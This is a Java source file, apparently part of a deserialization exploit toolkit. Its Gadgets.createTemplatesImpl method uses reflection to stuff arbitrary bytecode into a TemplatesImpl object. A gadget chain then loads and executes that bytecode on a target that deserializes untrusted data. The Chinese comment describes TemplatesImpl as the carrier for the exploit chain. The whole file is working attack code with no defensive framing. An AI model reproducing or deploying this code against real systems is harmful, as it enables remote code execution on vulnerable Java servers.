package payloads.util;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import payloads.check.TomcatGadgetCheck;

import java.lang.reflect.Field;

public class Gadgets {

    // templatesimpl 应该只是载体，让利用链进行加载
    public static Object createTemplatesImpl(byte[] bytes) throws Exception {
        byte[] classBytes = bytes;
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        Field f0 = templates.getClass().getDeclaredField("_bytecodes");
        f0.setAccessible(true);
        f0.set(templates,targetByteCodes);

        f0 = templates.getClass().getDeclaredField("_name");
        f0.setAccessible(true);
        f0.set(templates,"name");

        f0 = templates.getClass().getDeclaredField("_class");
        f0.setAccessible(true);
        f0.set(templates,null);
        return templates;
    }


}
